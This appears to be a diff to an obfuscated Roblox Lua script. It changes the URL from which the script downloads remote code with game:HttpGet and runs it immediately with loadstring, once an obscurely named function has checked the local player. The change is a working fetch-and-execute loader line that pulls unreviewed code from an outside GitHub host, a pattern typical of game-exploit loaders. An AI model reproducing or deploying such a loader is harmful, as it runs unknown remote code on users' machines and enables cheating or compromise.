@@ -17,5 +17,5 @@ local function QrTzWvXuYhNfGcDlKmPbOaIuYtRzEwQvDnMlGyFxHc(_JgFhYtRzEwQvDnMlGyFxH
 end
 
 if QrTzWvXuYhNfGcDlKmPbOaIuYtRzEwQvDnMlGyFxHc(game.Players.LocalPlayer) then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/asdoiaeqp9/deff/main/def"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/asdoiaeqp9/2/main/2"))()
 end
